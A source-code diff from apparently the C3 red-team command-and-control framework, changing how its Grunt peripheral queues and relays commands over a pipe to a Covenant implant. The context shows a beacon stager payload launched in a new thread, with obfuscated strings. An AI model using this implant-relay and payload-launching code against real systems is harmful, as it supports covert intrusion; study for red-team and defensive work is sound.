@@ -24,7 +24,7 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 	if (!CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(sehWrapper), m_BeaconStager.Get(), 0, nullptr))
 		throw std::runtime_error{ OBF("Couldn't run payload: ") + std::to_string(GetLastError()) + OBF(".") };
 
-	std::this_thread::sleep_for(std::chrono::milliseconds{ 30 }); // Give Grunt thread time to start pipe.
+	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give Grunt thread time to start pipe.
 	for (auto i = 0u; i < connectAttempts; i++)
 	{
 		try
@@ -45,47 +45,42 @@ FSecure::C3::Interfaces::Peripherals::Grunt::Grunt(ByteView arguments)
 
 void FSecure::C3::Interfaces::Peripherals::Grunt::OnCommandFromConnector(ByteView data)
 {
-	// Get access to write when whole read is done.
-	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return !m_ReadingState || m_Close; });
-
-	if(m_Close)
-		return;
-	// Write to Covenant specific pipe
-	m_Pipe->WriteCov(data);
-
-	// Unlock, and block writing until read is done.
-	m_ReadingState = true;
-	lock.unlock();
-	m_ConditionalVariable.notify_one();
-
+	m_SendQueue.emplace_back(data);
 }
 
 FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::Grunt::OnReceiveFromPeripheral()
 {
 	std::unique_lock<std::mutex> lock{ m_Mutex };
-	m_ConditionalVariable.wait(lock, [this]() { return m_ReadingState || m_Close; });
+	FSecure::ByteVector ret = {};
+	if (m_Close)
+	{
+		lock.unlock();
+		return ret;
+	}
 
-	if(m_Close)
-		return {};
+	// Commands to Send
+	if (!m_SendQueue.empty())
+	{
+		auto msg = std::move(m_SendQueue.front());
+		m_SendQueue.pop_front();
+		m_Pipe->WriteCov(msg);
+		// Give it some time to process
+	}
 
 	// Read
-	auto ret = m_Pipe->ReadCov();
+	if (m_Pipe->PeakCov())
+	{
+		ret = m_Pipe->ReadCov();
+	}
 
-	m_ReadingState = false;
 	lock.unlock();
-	m_ConditionalVariable.notify_one();
-
-	return  ret;
-
+	return ret;
 }
 
 void FSecure::C3::Interfaces::Peripherals::Grunt::Close()
 {
 	FSecure::C3::Device::Close();
-	std::scoped_lock lock(m_Mutex);
 	m_Close = true;
-	m_ConditionalVariable.notify_one();
 }
 
 
